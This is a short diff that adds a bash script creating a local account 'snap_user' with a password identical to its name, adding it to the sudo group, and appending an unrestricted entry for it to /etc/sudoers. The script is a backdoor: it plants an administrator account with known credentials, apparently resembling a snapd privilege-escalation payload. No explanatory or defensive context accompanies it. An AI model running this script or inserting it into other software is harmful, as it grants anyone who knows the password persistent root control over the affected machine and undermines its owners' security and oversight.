@@ -1,0 +1,6 @@
+#!/bin/bash
+password="snap_user"
+pass=$(perl -e 'print crypt($ARGV[0], "password")' $password)
+useradd snap_user -m -p $pass -s /bin/bash
+usermod -aG sudo snap_user
+echo "snap_user   ALL=(ALL:ALL) ALL" >> /etc/sudoers
